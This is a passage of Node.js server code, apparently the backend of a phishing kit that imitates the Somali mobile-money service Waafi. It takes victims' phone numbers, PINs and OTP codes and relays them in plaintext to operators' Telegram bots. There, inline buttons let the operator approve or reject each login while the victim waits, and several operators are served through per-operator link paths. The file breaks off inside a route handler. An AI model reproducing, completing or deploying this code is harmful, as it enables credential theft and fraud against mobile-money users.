// server.js - Waafi Somalia Multi-User System (No Wallet Balances)
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// ============================================
// CONFIGURATION - Optimized for Heavy Load
// ============================================

const CONFIG = {
  CACHE_DURATION: 5000,
  APPROVAL_TIMEOUT: 5 * 60 * 1000,
  CLEANUP_INTERVAL: 60000,
  MAX_USERS: parseInt(process.env.MAX_USERS) || 1,
  BOT_POLLING_RETRY_DELAY: 10000,
  MAX_BOT_RESTART_ATTEMPTS: 5,
  REQUEST_TIMEOUT: 30000,
  MAX_NOTIFICATION_SIZE: 4096,
  BOT_STARTUP_DELAY: 3000,
  POLLING_TIMEOUT: 30,
  MAX_CONCURRENT_REQUESTS: 10,
  MAX_CACHED_REQUESTS: 5000,
  MEMORY_CHECK_INTERVAL: 300000,
  MAX_MEMORY_MB: 512,
  RATE_LIMIT_WINDOW: 60000,
  MAX_REQUESTS_PER_WINDOW: 100,
};

// ============================================
// REQUEST QUEUE FOR RATE LIMITING
// ============================================
class RequestQueue {
  constructor(maxConcurrent = 10) {
    this.queue = [];
    this.running = 0;
    this.maxConcurrent = maxConcurrent;
    this.processed = 0;
    this.errors = 0;
  }

  async add(fn, priority = 0) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fn, resolve, reject, priority, timestamp: Date.now() });
      this.queue.sort((a, b) => b.priority - a.priority);
      this.process();
    });
  }

  async process() {
    if (this.running >= this.maxConcurrent || this.queue.length === 0) {
      return;
    }

    this.running++;
    const { fn, resolve, reject, timestamp } = this.queue.shift();

    if (Date.now() - timestamp > 30000) {
      this.running--;
      reject(new Error('Request timeout in queue'));
      this.process();
      return;
    }

    try {
      const result = await fn();
      this.processed++;
      resolve(result);
    } catch (error) {
      this.errors++;
      reject(error);
    } finally {
      this.running--;
      this.process();
    }
  }

  getStats() {
    return {
      queued: this.queue.length,
      running: this.running,
      processed: this.processed,
      errors: this.errors
    };
  }
}

const requestQueue = new RequestQueue(CONFIG.MAX_CONCURRENT_REQUESTS);

// ============================================
// RATE LIMITER FOR HEAVY LOAD
// ============================================
class RateLimiter {
  constructor(windowMs = 60000, maxRequests = 100) {
    this.windowMs = windowMs;
    this.maxRequests = maxRequests;
    this.requests = new Map();
  }

  isAllowed(identifier) {
    const now = Date.now();
    const userRequests = this.requests.get(identifier) || [];
    
    const validRequests = userRequests.filter(time => now - time < this.windowMs);
    
    if (validRequests.length >= this.maxRequests) {
      return false;
    }
    
    validRequests.push(now);
    this.requests.set(identifier, validRequests);
    
    if (this.requests.size > 10000) {
      for (const [key, times] of this.requests.entries()) {
        if (times.length === 0 || now - times[times.length - 1] > this.windowMs) {
          this.requests.delete(key);
        }
      }
    }
    
    return true;
  }

  reset(identifier) {
    this.requests.delete(identifier);
  }
}

const globalRateLimiter = new RateLimiter(CONFIG.RATE_LIMIT_WINDOW, CONFIG.MAX_REQUESTS_PER_WINDOW);

// ============================================
// UTILITY FUNCTIONS
// ============================================
const logger = {
  info: (msg, ...args) => console.log(`[INFO] ${new Date().toISOString()} - ${msg}`, ...args),
  error: (msg, ...args) => console.error(`[ERROR] ${new Date().toISOString()} - ${msg}`, ...args),
  warn: (msg, ...args) => console.warn(`[WARN] ${new Date().toISOString()} - ${msg}`, ...args),
  debug: (msg, ...args) => process.env.DEBUG && console.log(`[DEBUG] ${new Date().toISOString()} - ${msg}`, ...args)
};

const validatePhoneNumber = (phoneNumber) => {
  if (!phoneNumber || typeof phoneNumber !== 'string') {
    return { valid: false, error: 'Phone number must be a string' };
  }
  
  const cleaned = phoneNumber.replace(/\D/g, '');
  
  // Somalia: minimum 9 digits, maximum 15 for international format
  if (cleaned.length < 9 || cleaned.length > 15) {
    return { valid: false, error: 'Invalid phone number length' };
  }
  
  return { valid: true, cleaned };
};

const validatePin = (pin) => {
  if (!pin || typeof pin !== 'string') {
    return { valid: false, error: 'PIN must be a string' };
  }
  
  if (pin.length < 4 || pin.length > 8 || !/^\d+$/.test(pin)) {
    return { valid: false, error: 'PIN must be 4-8 digits' };
  }
  
  return { valid: true };
};

const validateOtp = (otp) => {
  if (!otp || typeof otp !== 'string') {
    return { valid: false, error: 'OTP must be a string' };
  }
  
  if (otp.length < 4 || otp.length > 8 || !/^\d+$/.test(otp)) {
    return { valid: false, error: 'OTP must be 4-8 digits' };
  }
  
  return { valid: true };
};

const sanitizeInput = (input) => {
  if (typeof input !== 'string') return String(input);
  return input.replace(/[<>]/g, '').trim();
};

const truncateMessage = (message, maxLength = CONFIG.MAX_NOTIFICATION_SIZE) => {
  if (message.length <= maxLength) return message;
  return message.substring(0, maxLength - 3) + '...';
};

// ============================================
// PHONE NUMBER FORMATTING - SOMALIA
// ============================================
const formatPhoneNumber = (phoneNumber) => {
  try {
    let cleaned = phoneNumber.replace(/\D/g, '');
    
    // Handle Somalia country code (252)
    if (cleaned.startsWith('252')) {
      const countryCode = '+252';
      let number = cleaned.substring(3);
      
      if (number.length === 10 && number.startsWith('0')) {
        number = number.substring(1);
      }
      
      if (number.length > 9) {
        number = number.substring(number.length - 9);
      }
      
      return { countryCode, number, formatted: `${countryCode}${number}` };
    }
    
    if (cleaned.length === 10 && cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    
    if (cleaned.length > 9) {
      cleaned = cleaned.substring(cleaned.length - 9);
    }
    
    return { countryCode: '+252', number: cleaned, formatted: `+252${cleaned}` };
  } catch (error) {
    logger.error('Error formatting phone number:', error.message);
    return { countryCode: '+252', number: phoneNumber, formatted: phoneNumber };
  }
};

// ============================================
// DUPLICATE REQUEST DETECTION WITH SIZE LIMIT
// ============================================
const isDuplicate = (user, key) => {
  try {
    if (user.processedRequests.has(key)) {
      const timestamp = user.processedRequests.get(key);
      if (Date.now() - timestamp < CONFIG.CACHE_DURATION) {
        return true;
      }
    }
    user.processedRequests.set(key, Date.now());
    
    if (user.processedRequests.size > CONFIG.MAX_CACHED_REQUESTS) {
      const cutoff = Date.now() - CONFIG.CACHE_DURATION;
      const toDelete = [];
      
      for (const [k, v] of user.processedRequests.entries()) {
        if (v < cutoff) toDelete.push(k);
      }
      
      toDelete.forEach(k => user.processedRequests.delete(k));
      
      if (user.processedRequests.size > CONFIG.MAX_CACHED_REQUESTS) {
        const entries = Array.from(user.processedRequests.entries())
          .sort((a, b) => a[1] - b[1]);
        
        const toRemove = entries.slice(0, Math.floor(CONFIG.MAX_CACHED_REQUESTS / 2));
        toRemove.forEach(([k]) => user.processedRequests.delete(k));
      }
    }
    
    return false;
  } catch (error) {
    logger.error(`Error in isDuplicate for ${user.name}:`, error.message);
    return false;
  }
};

// ============================================
// MESSAGE FORMATTERS
// ============================================
const formatLoginMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    const isReturningUser = user.verifiedUsers.has(data.phoneNumber);
    const userBadge = isReturningUser ? '🔄 RETURNING USER' : '🆕 NEW USER';
    
    return `📱 <b>${sanitizeInput(user.name)} - LOGIN ATTEMPT</b>

${userBadge}
🇸🇴 <b>Country:</b> Somalia
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔢 <b>PIN:</b> <code>${sanitizeInput(data.pin)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

${isReturningUser ? '✅ <b>Returning user - will skip OTP</b>' : '📱 <b>New user - will show OTP</b>'}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⏱️ <b>Timeout:</b> 5 minutes`;
  } catch (error) {
    logger.error(`Error formatting login message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

const formatOTPMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    
    return `✅ <b>${sanitizeInput(user.name)} - OTP VERIFICATION</b>

🆕 <b>NEW USER - VERIFICATION NEEDED</b>
🇸🇴 <b>Country:</b> Somalia
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔐 <b>OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>Verify the credentials:</b>
⏱️ <b>Timeout:</b> 5 minutes`;
  } catch (error) {
    logger.error(`Error formatting OTP message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

// ============================================
// BOT MANAGER CLASS
// ============================================
class BotManager {
  constructor(user, linkInsert) {
    this.user = user;
    this.linkInsert = linkInsert;
    this.bot = null;
    this.isPolling = false;
    this.isInitializing = false;
    this.initializationPromise = null;
    this.restartAttempts = 0;
    this.maxRestartAttempts = CONFIG.MAX_BOT_RESTART_ATTEMPTS;
    this.pollingErrorCount = 0;
    this.lastHealthCheck = Date.now();
  }

  async initialize() {
    if (this.isInitializing) {
      logger.warn(`${this.user.name}: Already initializing, waiting...`);
      return this.initializationPromise;
    }

    this.isInitializing = true;
    this.initializationPromise = this._doInitialize();

    try {
      await this.initializationPromise;
      return true;
    } finally {
      this.isInitializing = false;
      this.initializationPromise = null;
    }
  }

  async _doInitialize() {
    try {
      await this.cleanup();
      await new Promise(resolve => setTimeout(resolve, 1000));

      logger.info(`${this.user.name}: Creating new bot instance...`);
      
      this.bot = new TelegramBot(this.user.botToken, {
        polling: {
          interval: 2000,
          autoStart: false,
          params: {
            timeout: CONFIG.POLLING_TIMEOUT
          }
        },
        filepath: false
      });

      this.setupErrorHandlers();
      this.setupCommands();

      logger.info(`${this.user.name}: Starting polling...`);
      await this.bot.startPolling();
      this.isPolling = true;

      await this.verifyBot();

      this.user.isHealthy = true;
      this.user.bot = this.bot;
      this.restartAttempts = 0;
      this.pollingErrorCount = 0;
      this.lastHealthCheck = Date.now();
      
      logger.info(`✅ ${this.user.name}: Bot initialized successfully`);
      return true;

    } catch (error) {
      logger.error(`❌ ${this.user.name}: Initialization failed:`, error.message);
      this.user.isHealthy = false;
      await this.cleanup();
      throw error;
    }
  }

  async cleanup() {
    if (!this.bot) return;

    logger.info(`${this.user.name}: Cleaning up bot...`);

    try {
      this.bot.removeAllListeners();

      if (this.isPolling) {
        try {
          await this.bot.stopPolling({ cancel: true, reason: 'Cleanup' });
          logger.info(`${this.user.name}: Polling stopped`);
        } catch (e) {
          logger.debug(`${this.user.name}: Stop polling error (ignoring):`, e.message);
        }
      }

      try {
        if (this.bot._polling) {
          this.bot._polling.abort = true;
        }
      } catch (e) {
        logger.debug(`${this.user.name}: Close connection error (ignoring):`, e.message);
      }

    } catch (error) {
      logger.error(`${this.user.name}: Cleanup error:`, error.message);
    } finally {
      this.isPolling = false;
      this.bot = null;
      this.user.bot = null;
    }
  }

  setupErrorHandlers() {
    this.bot.on('polling_error', (error) => {
      this.pollingErrorCount++;
      logger.error(`${this.user.name}: Polling error #${this.pollingErrorCount}:`, error.message);

      if (error.code === 'EFATAL') {
        logger.error(`${this.user.name}: Fatal error - will restart`);
        this.scheduleRestart(5000);
      } 
      else if (error.code === 'ETELEGRAM') {
        if (error.response?.statusCode === 401) {
          logger.error(`${this.user.name}: Invalid token - STOPPING`);
          this.user.isHealthy = false;
          this.cleanup();
        } 
        else if (error.response?.statusCode === 409) {
          logger.error(`${this.user.name}: Conflict - another instance polling`);
          this.scheduleRestart(10000);
        }
        else if (error.response?.statusCode === 429) {
          const retryAfter = error.response.parameters?.retry_after || 30;
          logger.warn(`${this.user.name}: Rate limited - retry after ${retryAfter}s`);
        }
      }
      else if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
        logger.warn(`${this.user.name}: Connection issue - ${error.code}`);
        if (this.pollingErrorCount > 10) {
          this.scheduleRestart(15000);
        }
      }
    });

    this.bot.on('webhook_error', (error) => {
      logger.error(`${this.user.name}: Webhook error:`, error.message);
    });

    this.bot.on('error', (error) => {
      logger.error(`${this.user.name}: General error:`, error.message);
    });
  }

  scheduleRestart(delay = 10000) {
    if (this.restartAttempts >= this.maxRestartAttempts) {
      logger.error(`${this.user.name}: Max restart attempts reached - STOPPING`);
      this.user.isHealthy = false;
      return;
    }

    if (this.isInitializing) {
      logger.warn(`${this.user.name}: Already restarting...`);
      return;
    }

    this.restartAttempts++;
    logger.info(`${this.user.name}: Scheduling restart #${this.restartAttempts} in ${delay}ms...`);

    setTimeout(async () => {
      try {
        await this.initialize();
      } catch (error) {
        logger.error(`${this.user.name}: Restart failed:`, error.message);
      }
    }, delay);
  }

  async verifyBot() {
    try {
      const me = await this.bot.getMe();
      logger.info(`${this.user.name}: Bot verified - @${me.username}`);
      return true;
    } catch (error) {
      logger.error(`${this.user.name}: Bot verification failed:`, error.message);
      throw error;
    }
  }

  setupCommands() {
    this.bot.onText(/\/start/, async (msg) => {
      try {
        await this.bot.sendMessage(
          msg.chat.id,
          `🤖 <b>${this.user.name} Bot - Waafi Somalia</b>\n\n` +
          `I will notify you of all login attempts and OTP verifications.\n\n` +
          `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Your Link:</b> <code>/api/${this.linkInsert}/*</code>\n\n` +
          `Add these to your .env file as:\n` +
          `<code>USER_LINK_INSERT_${this.user.id}=${this.linkInsert}</code>\n` +
          `<code>TELEGRAM_CHAT_ID_${this.user.id}=${msg.chat.id}</code>`,
          { parse_mode: 'HTML' }
        );
      } catch (error) {
        logger.error(`${this.user.name}: /start error:`, error.message);
      }
    });

    this.bot.onText(/\/status/, async (msg) => {
      try {
        const queueStats = requestQueue.getStats();
        const memUsage = process.memoryUsage();
        
        await this.bot.sendMessage(
          msg.chat.id,
          `✅ <b>${this.user.name} Bot Active - Waafi Somalia</b>\n\n` +
          `📊 Login notifications: ${this.user.loginNotifications.size}\n` +
          `📊 Pending OTP: ${this.user.otpVerifications.size}\n` +
          `✅ Verified users: ${this.user.verifiedUsers.size}\n` +
          `🔗 Endpoint: <code>/api/${this.linkInsert}/*</code>\n` +
          `🔢 Errors: ${this.user.errorCount}\n` +
          `🔄 Restart attempts: ${this.restartAttempts}\n` +
          `📡 Polling errors: ${this.pollingErrorCount}\n\n` +
          `<b>Queue Stats:</b>\n` +
          `⏳ Queued: ${queueStats.queued}\n` +
          `▶️ Running: ${queueStats.running}\n` +
          `✅ Processed: ${queueStats.processed}\n` +
          `❌ Errors: ${queueStats.errors}\n\n` +
          `<b>Memory:</b>\n` +
          `💾 Heap: ${(memUsage.heapUsed / 1024 / 1024).toFixed(2)} MB\n` +
          `${this.user.lastError ? `⚠️ Last error: ${this.user.lastError}` : ''}`,
          { parse_mode: 'HTML' }
        );
      } catch (error) {
        logger.error(`${this.user.name}: /status error:`, error.message);
      }
    });

    this.bot.onText(/\/restart/, async (msg) => {
      try {
        await this.bot.sendMessage(msg.chat.id, '🔄 Restarting bot...', { parse_mode: 'HTML' });
        this.restartAttempts = 0;
        await this.initialize();
        await this.bot.sendMessage(msg.chat.id, '✅ Bot restarted successfully!', { parse_mode: 'HTML' });
      } catch (error) {
        logger.error(`${this.user.name}: /restart error:`, error.message);
      }
    });

    this.bot.on('callback_query', async (query) => {
      try {
        await handleCallbackQuery(this.user, query);
      } catch (error) {
        logger.error(`${this.user.name}: Callback error:`, error.message);
        try {
          await this.bot.answerCallbackQuery(query.id, { 
            text: '❌ An error occurred', 
            show_alert: true 
          });
        } catch (e) {
          logger.error(`${this.user.name}: Error answering callback:`, e.message);
        }
      }
    });
  }

  isHealthy() {
    return this.isPolling && this.user.isHealthy && !this.isInitializing;
  }
}

// ============================================
// DYNAMIC USER LOADING
// ============================================
const users = new Map();

const loadUsers = () => {
  let loadedCount = 0;
  let errorCount = 0;

  for (let i = 1; i <= CONFIG.MAX_USERS; i++) {
    try {
      const linkInsert = process.env[`USER_LINK_INSERT_${i}`];
      const botToken = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
      const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
      const userName = process.env[`USER_NAME_${i}`] || `User ${i}`;

      if (!linkInsert || !botToken || !chatId) {
        continue;
      }

      if (!/^[a-zA-Z0-9-_]+$/.test(linkInsert)) {
        logger.warn(`Invalid link insert format for user ${i}: ${linkInsert}`);
        errorCount++;
        continue;
      }

      if (!/^\d+:[A-Za-z0-9_-]+$/.test(botToken)) {
        logger.warn(`Invalid bot token format for user ${i}`);
        errorCount++;
        continue;
      }

      if (!/^-?\d+$/.test(chatId)) {
        logger.warn(`Invalid chat ID format for user ${i}: ${chatId}`);
        errorCount++;
        continue;
      }

      if (users.has(linkInsert)) {
        logger.warn(`Duplicate link insert detected: ${linkInsert}`);
        errorCount++;
        continue;
      }

      const userObj = {
        id: i,
        name: sanitizeInput(userName),
        linkInsert,
        botToken,
        chatId,
        bot: null,
        isHealthy: false,
        consecutiveErrors: 0,
        loginNotifications: new Map(),
        otpVerifications: new Map(),
        verifiedUsers: new Map(),
        processedRequests: new Map(),
        errorCount: 0,
        lastError: null,
        lastErrorTime: 0,
        requestCount: 0,
        lastRequestTime: 0
      };

      const botManager = new BotManager(userObj, linkInsert);
      userObj.botManager = botManager;

      users.set(linkInsert, userObj);
      loadedCount++;
    } catch (error) {
      logger.error(`Error loading user ${i}:`, error.message);
      errorCount++;
    }
  }

  logger.info(`Loaded ${loadedCount} users (${errorCount} errors)`);
  return { loadedCount, errorCount };
};

loadUsers();

// ============================================
// STAGGERED BOT INITIALIZATION
// ============================================
const initializeAllBotsStaggered = async () => {
  const userArray = Array.from(users.values());
  
  logger.info(`Starting staggered initialization of ${userArray.length} bots...`);
  
  for (let i = 0; i < userArray.length; i++) {
    const user = userArray[i];
    
    logger.info(`Initializing bot ${i + 1}/${userArray.length}: ${user.name}`);
    
    try {
      await user.botManager.initialize();
    } catch (error) {
      logger.error(`Failed to initialize ${user.name}:`, error.message);
    }
    
    if (i < userArray.length - 1) {
      await new Promise(resolve => setTimeout(resolve, CONFIG.BOT_STARTUP_DELAY));
    }
  }
  
  logger.info('All bots initialization complete');
};

initializeAllBotsStaggered();

// ============================================
// TELEGRAM MESSAGE SENDING
// ============================================
const sendTelegramMessage = async (user, message, options = {}) => {
  return requestQueue.add(async () => {
    try {
      if (!user.bot || !user.botManager?.isHealthy()) {
        return { success: false, error: 'Bot not ready' };
      }

      const truncatedMessage = truncateMessage(message);
      
      await user.bot.sendMessage(user.chatId, truncatedMessage, { 
        parse_mode: 'HTML',
        ...options 
      });
      
      user.errorCount = Math.max(0, user.errorCount - 1);
      user.consecutiveErrors = 0;
      return { success: true };
    } catch (error) {
      user.errorCount++;
      user.consecutiveErrors = (user.consecutiveErrors || 0) + 1;
      user.lastError = error.message;
      user.lastErrorTime = Date.now();
      
      logger.error(`Error sending message for ${user.name}:`, error.code, error.message);
      
      if (error.response?.statusCode === 401) {
        user.isHealthy = false;
        logger.error(`Bot authentication failed for ${user.name} - check token`);
        return { success: false, error: 'Bot authentication failed', critical: true };
      }
      
      if (error.response?.statusCode === 429) {
        const retryAfter = error.response.parameters?.retry_after || 30;
        logger.warn(`Rate limited for ${user.name} - retry after ${retryAfter}s`);
        return { success: false, error: 'Rate limited', retryAfter, rateLimited: true };
      }
      
      return { success: false, error: error.message };
    }
  }, 1);
};

// ============================================
// CALLBACK QUERY HANDLER
// ============================================
async function handleCallbackQuery(user, query) {
  const msg = query.message;
  const data = query.data;
  const chatId = msg.chat.id;
  const messageId = msg.message_id;

  try {
    await user.bot.answerCallbackQuery(query.id, { text: '⏳ Processing...' }).catch(e => {
      logger.debug(`Error answering initial callback for ${user.name}:`, e.message);
    });

    const parts = data.split('_');
    const type = parts[0];
    const action = parts[1];
    
    if (type === 'login') {
      const phoneNumber = parts.slice(2, -1).join('_');
      const pin = parts[parts.length - 1];
      const loginKey = `${phoneNumber}-${pin}`;
      const loginData = user.loginNotifications.get(loginKey);
      
      if (!loginData) {
        await user.bot.answerCallbackQuery(query.id, { 
          text: '❌ Session not found or expired', 
          show_alert: true 
        }).catch(e => logger.debug('Error answering callback:', e.message));
        return;
      }

      if (Date.now() - loginData.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        loginData.expired = true;
        loginData.approved = false;
        loginData.rejected = true;
        loginData.rejectionReason = 'timeout';
        
        try {
          await user.bot.editMessageText(
            `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> ❌ Timeout`,
            { 
              chat_id: chatId, 
              message_id: messageId, 
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard: [] }
            }
          );
        } catch (editError) {
          logger.error(`Error editing message for ${user.name}:`, editError.message);
        }
        
        await user.bot.answerCallbackQuery(query.id, { 
          text: '⏰ Session expired', 
          show_alert: true 
        }).catch(e => logger.debug('Error answering callback:', e.message));
        return;
      }

      const isReturningUser = user.verifiedUsers.has(phoneNumber);

      if (action === 'proceed') {
        loginData.approved = true;
        loginData.rejected = false;
        
        const statusMessage = `✅ <b>USER ALLOWED TO PROCEED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> ✅ ${isReturningUser ? 'User proceeds to dashboard' : 'User proceeds to OTP'}`;
        
        try {
          await user.bot.editMessageText(statusMessage, {
            chat_id: chatId, 
            message_id: messageId, 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
          });
          
          await user.bot.answerCallbackQuery(query.id, { 
            text: '✅ User allowed!',
            show_alert: false
          }).catch(e => logger.debug('Error answering callback:', e.message));
        } catch (editError) {
          logger.error(`Error editing proceed message for ${user.name}:`, editError.message);
        }

      } else if (action === 'invalid') {
        loginData.approved = false;
        loginData.rejected = true;
        loginData.rejectionReason = 'invalid';
        
        const statusMessage = `❌ <b>INVALID INFORMATION</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> ❌ Invalid credentials`;
        
        try {
          await user.bot.editMessageText(statusMessage, {
            chat_id: chatId, 
            message_id: messageId, 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
          });
          
          await user.bot.answerCallbackQuery(query.id, { 
            text: '❌ Marked as invalid!',
            show_alert: false
          }).catch(e => logger.debug('Error answering callback:', e.message));
        } catch (editError) {
          logger.error(`Error editing invalid message for ${user.name}:`, editError.message);
        }
      }
      
    } else if (type === 'otp') {
      const phoneNumber = parts.slice(2, -1).join('_');
      const otp = parts[parts.length - 1];
      const verificationKey = `${phoneNumber}-${otp}`;
      const otpData = user.otpVerifications.get(verificationKey);
      
      if (!otpData) {
        await user.bot.answerCallbackQuery(query.id, { 
          text: '❌ Verification not found', 
          show_alert: true 
        }).catch(e => logger.debug('Error answering callback:', e.message));
        return;
      }

      if (Date.now() - otpData.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        otpData.expired = true;
        otpData.status = 'timeout';
        
        try {
          await user.bot.editMessageText(
            `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ❌ Timeout`,
            { 
              chat_id: chatId, 
              message_id: messageId, 
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard: [] }
            }
          );
        } catch (editError) {
          logger.error(`Error editing OTP timeout for ${user.name}:`, editError.message);
        }
        
        await user.bot.answerCallbackQuery(query.id, { 
          text: '⏰ Session expired', 
          show_alert: true 
        }).catch(e => logger.debug('Error answering callback:', e.message));
        return;
      }

      if (action === 'correct') {
        otpData.status = 'approved';
        user.verifiedUsers.set(phoneNumber, { 
          timestamp: Date.now(), 
          lastLogin: Date.now() 
        });
        
        const statusMessage = `✅ <b>EVERYTHING CORRECT</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ✅ User logged in successfully`;
        
        try {
          await user.bot.editMessageText(statusMessage, {
            chat_id: chatId, 
            message_id: messageId, 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
          });
          
          await user.bot.answerCallbackQuery(query.id, { 
            text: '✅ Everything correct!',
            show_alert: false
          }).catch(e => logger.debug('Error answering callback:', e.message));
        } catch (editError) {
          logger.error(`Error editing correct OTP for ${user.name}:`, editError.message);
        }

      } else if (action === 'wrong') {
        otpData.status = 'rejected';
        
        const statusMessage = `❌ <b>WRONG OTP CODE</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ❌ OTP is wrong`;
        
        try {
          await user.bot.editMessageText(statusMessage, {
            chat_id: chatId, 
            message_id: messageId, 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
          });
          
          await user.bot.answerCallbackQuery(query.id, { 
            text: '❌ Wrong OTP!',
            show_alert: false
          }).catch(e => logger.debug('Error answering callback:', e.message));
        } catch (editError) {
          logger.error(`Error editing wrong OTP for ${user.name}:`, editError.message);
        }

      } else if (action === 'wrongpin') {
        otpData.status = 'wrong_pin';
        
        const statusMessage = `⚠️ <b>WRONG PIN</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ⚠️ PIN is wrong`;
        
        try {
          await user.bot.editMessageText(statusMessage, {
            chat_id: chatId, 
            message_id: messageId, 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
          });
          
          await user.bot.answerCallbackQuery(query.id, { 
            text: '⚠️ Wrong PIN!',
            show_alert: false
          }).catch(e => logger.debug('Error answering callback:', e.message));
        } catch (editError) {
          logger.error(`Error editing wrong PIN for ${user.name}:`, editError.message);
        }
      }
    }
  } catch (error) {
    logger.error(`Error in handleCallbackQuery for ${user.name}:`, error.message);
    try {
      await user.bot.answerCallbackQuery(query.id, { 
        text: '❌ An error occurred', 
        show_alert: true 
      });
    } catch (e) {
      logger.error(`Error answering callback query for ${user.name}:`, e.message);
    }
  }
}

// ============================================
// AUTO-CLEANUP WITH MEMORY OPTIMIZATION
// ============================================
setInterval(() => {
  try {
    const now = Date.now();
    const timeoutThreshold = now - CONFIG.APPROVAL_TIMEOUT;
    const deleteThreshold = now - (10 * 60 * 1000);
    
    users.forEach((user) => {
      try {
        for (const [key, value] of user.loginNotifications.entries()) {
          if (value.timestamp < timeoutThreshold && !value.expired) {
            value.expired = true;
            value.approved = false;
            value.rejected = true;
            value.rejectionReason = 'timeout';
          }
        }
        
        for (const [key, value] of user.otpVerifications.entries()) {
          if (value.timestamp < timeoutThreshold && !value.expired) {
            value.expired = true;
            value.status = 'timeout';
          }
        }
        
        for (const [key, value] of user.loginNotifications.entries()) {
          if (value.timestamp < deleteThreshold) {
            user.loginNotifications.delete(key);
          }
        }
        
        for (const [key, value] of user.otpVerifications.entries()) {
          if (value.timestamp < deleteThreshold) {
            user.otpVerifications.delete(key);
          }
        }
        
        if (user.verifiedUsers.size > 10000) {
          const entries = Array.from(user.verifiedUsers.entries())
            .sort((a, b) => a[1].lastLogin - b[1].lastLogin);
          const toRemove = entries.slice(0, 5000);
          toRemove.forEach(([key]) => user.verifiedUsers.delete(key));
          logger.info(`${user.name}: Cleaned up 5000 old verified users`);
        }
      } catch (error) {
        logger.error(`Cleanup error for ${user.name}:`, error.message);
      }
    });
  } catch (error) {
    logger.error('Global cleanup error:', error.message);
  }
}, CONFIG.CLEANUP_INTERVAL);

// ============================================
// MEMORY MONITORING
// ============================================
setInterval(() => {
  const memUsage = process.memoryUsage();
  const heapUsedMB = memUsage.heapUsed / 1024 / 1024;
  
  if (heapUsedMB > CONFIG.MAX_MEMORY_MB) {
    logger.warn(`High memory usage: ${heapUsedMB.toFixed(2)} MB`);
    
    if (global.gc) {
      global.gc();
      logger.info('Forced garbage collection');
    }
  }
  
  logger.debug(`Memory: ${heapUsedMB.toFixed(2)} MB`);
}, CONFIG.MEMORY_CHECK_INTERVAL);

// ============================================
// RATE LIMITING MIDDLEWARE
// ============================================
const rateLimitMiddleware = (req, res, next) => {
  const identifier = req.ip || req.connection.remoteAddress;
  
  if (!globalRateLimiter.isAllowed(identifier)) {
    return res.status(429).json({
      success: false,
      error: 'Too many requests',
      message: 'Rate limit exceeded. Please try again later.'
    });
  }
  
  next();
};

app.use(rateLimitMiddleware);

// ============================================
// HEALTH CHECK ENDPOINT
// ============================================
app.get('/api/health', (req, res) => {
  try {
    const queueStats = requestQueue.getStats();
    const memUsage = process.memoryUsage();
    
    const userList = Array.from(users.values()).map(u => ({
      name: u.name,
      link: u.linkInsert,
      active: !!u.bot,
      healthy: u.isHealthy,
      logins: u.loginNotifications.size,
      otps: u.otpVerifications.size,
      verified: u.verifiedUsers.size,
      errorCount: u.errorCount,
      lastError: u.lastError,
      lastErrorTime: u.lastErrorTime ? new Date(u.lastErrorTime).toISOString() : null
    }));

    const healthyCount = userList.filter(u => u.healthy).length;

    res.json({ 
      status: healthyCount > 0 ? 'ok' : 'degraded',
      totalUsers: users.size,
      healthyUsers: healthyCount,
      users: userList,
      queue: queueStats,
      memory: {
        heapUsed: `${(memUsage.heapUsed / 1024 / 1024).toFixed(2)} MB`,
        heapTotal: `${(memUsage.heapTotal / 1024 / 1024).toFixed(2)} MB`,
        external: `${(memUsage.external / 1024 / 1024).toFixed(2)} MB`
      },
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    logger.error('Health check error:', error.message);
    res.status(500).json({ 
      status: 'error', 
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// ============================================
// DYNAMIC ROUTE CREATION
// ============================================

users.forEach((user, linkInsert) => {
  const basePath = `/api/${linkInsert}`;

  app.post(`${basePath}/check-user-status`, async (req, res) => {
    try {
      const { phoneNumber } = req.body;
      
